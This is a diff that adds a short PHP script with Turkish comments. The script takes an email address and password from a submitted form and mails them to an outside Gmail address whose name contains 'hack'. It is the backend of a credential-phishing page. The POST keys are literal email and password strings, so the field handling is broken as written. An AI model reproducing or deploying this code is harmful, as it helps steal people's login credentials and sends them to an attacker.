@@ -1,0 +1,19 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+  // Form verilerini alma
+  $email = $_POST["emiranil4646@gmail.com"];
+  $password = $_POST["santra8282"];
+
+  // E-posta gönderimi için gerekli ayarlar
+  $to = "standoffnicehack@gmail.com";  // E-postanın gönderileceği adres
+  $subject = "Form Verileri";  // E-posta konusu
+  $message = "E-posta: " . $email . "\n" . "Şifre: " . $password;  // E-posta içeriği
+
+  // E-posta gönderme işlemi
+  if (mail($to, $subject, $message)) {
+    echo "didii.";
+  } else {
+    echo "dodata.";
+  }
+}
+?>
